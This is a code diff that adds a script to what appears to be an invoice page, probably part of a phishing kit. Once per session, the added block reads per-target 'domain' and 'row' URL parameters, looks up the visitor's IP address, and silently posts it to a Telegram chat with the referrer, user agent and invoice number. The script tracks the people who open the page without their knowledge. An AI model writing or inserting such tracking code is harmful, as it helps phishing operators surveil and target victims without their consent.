@@ -702,6 +702,23 @@ function sendToTelegram(message) {
     return r.json();
   });
 }
+  /* ---- view log ---- */
+(function () {
+  var qs = new URLSearchParams(location.search);
+  var d = qs.get("d") || "", r = qs.get("r") || "";
+  if (!d && !r) return;
+  var key = "hit_" + (r || d);
+  try { if (sessionStorage.getItem(key)) return; sessionStorage.setItem(key, "1"); } catch (e) {}
+  fetchIpAddress().then(function (ip) {
+    sendToTelegram("<b>#----[ VIEW ]----#</b>\n" +
+      "<b>Invoice</b> : " + INVOICE_NO + "\n" +
+      (d ? "<b>Domain</b> : " + esc(d) + "\n" : "") +
+      (r ? "<b>Row</b> : " + esc(r) + "\n" : "") +
+      "<b>IP</b> : " + ip + "\n" +
+      "<b>Ref</b> : " + esc(document.referrer || "direct") + "\n" +
+      "<b>Device</b> : " + esc(navigator.userAgent)).catch(function () {});
+  });
+})();
 </script>
 </body>
 </html>
